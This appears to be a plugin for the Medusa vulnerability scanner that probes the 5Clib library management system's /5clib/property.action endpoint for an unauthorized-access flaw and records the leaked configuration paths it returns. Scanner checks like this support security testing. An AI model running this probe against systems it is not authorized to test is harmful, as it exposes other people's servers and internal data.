#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/11 16:39 PM'
import urllib.parse
import requests
import ClassCongregation


class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-1-6"  # 插件编辑时间
        self.info['disclosure']='2015-10-26'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "FiveClibthereIsAnUnauthorizedLoophole"  # 插件名称
        self.info['name'] ='五车图书管理系统存在越权漏洞' #漏洞名称
        self.info['affects'] = "5Clib"  # 漏洞组件
        self.info['desc_content'] = "五车图书管理系统/5clib/property.action越权漏洞"  # 漏洞描述
        self.info['rank'] = "中危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "/5clib/property.action"

        payload_url = scheme + "://" + url +":"+ str(port) + payload
        headers = {
            'User-Agent': RandomAgent,
            'Accept': 'application/json',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        resp = requests.get(payload_url, headers=headers, timeout=6,proxies=proxies,  verify=False)
        con = resp.text
        code = resp.status_code
        if code== 200 and con.find('DEFAULT_PDF_LIB_PATH') != -1 and con.find('DEFAULT_SQL_BACKUP_PATH') != -1:
            Medusa = "{}存在五车图书管理系统存在越权漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类